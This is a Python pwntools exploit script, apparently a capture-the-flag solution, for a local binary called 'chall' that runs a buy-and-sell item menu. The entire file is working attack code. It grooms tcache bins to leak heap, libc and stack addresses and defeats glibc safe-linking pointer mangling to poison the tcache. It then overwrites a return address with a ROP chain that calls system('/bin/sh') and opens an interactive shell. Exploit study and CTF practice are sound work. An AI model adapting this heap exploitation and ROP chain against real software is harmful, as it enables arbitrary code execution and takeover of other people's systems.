#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def buy_item(idx, price=0x0):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b"? ", str(idx).encode())
    if price != 0:
        io.sendlineafter(b"? ", str(price).encode())

def sell_item(name, price):
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b"? ", name)
    io.sendlineafter(b"? ", str(price).encode())
    io.sendlineafter(b"(y/n) ", b"y")

def get_leak(idx):
    io.sendlineafter(b": ", b"4")
    io.recvuntil(f" {str(idx)}: ".encode())
    return u64(io.recvline().strip().ljust(8, b'\x00'))

io = process(exe.path)

for i in range(7): sell_item(b"A"*8, 100)

sell_item(b" A"*4, 10000)
sell_item(b"A"*8, 100)
sell_item(b"A"*8, 100)

for i in range(7): buy_item(i, 10000)

buy_item(7)
heap_base = get_leak(7)<<12

buy_item(8, 10000)

io.sendlineafter(b": ", b'0'*0xfff+b'4')
libc.address = get_leak(7) - 0x1d3d70

buy_item(9, 10000)

for i in range(7): sell_item(b"A"*8, 100)
sell_item(b"A"*8, 100)
sell_item(b"A"*8, 100)
sell_item(b"A"*8, 100)

for i in range(7): buy_item(i, 10000000)

buy_item(9, 10000)
buy_item(10, 10000)
buy_item(7, 10000)

for i in range(7): sell_item(b"A"*8, 100)
sell_item(p64((heap_base+0x780)^(heap_base>>12)), 100)
sell_item(b"A"*0x10 + p64(0^(heap_base>>12)), 100)
sell_item(b"A"*8, 100)
sell_item(b"A"*8, 100)

io.sendlineafter(b": ", b"4")
io.recvuntil(b" 9: ")
io.recvuntil(b": ")
stack_leak = u64(io.recvline().strip().ljust(8, b'\x00'))

for i in range(7): buy_item(i, 10000000)

buy_item(10, 10000)
buy_item(8, 10000)
buy_item(7, 10000)

for i in range(7): sell_item(b"A"*8, 100)
sell_item(p64((stack_leak-0x78-0x8)^(heap_base>>12)), 100)
sell_item(b"A"*8, 100)
sell_item(b"A"*8, 100)
sell_item(p64(stack_leak-48) + p64(libc.address + 0x271c2) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.address + 0x24a62) + p64(libc.sym.system)[0:7], 100)

io.interactive()

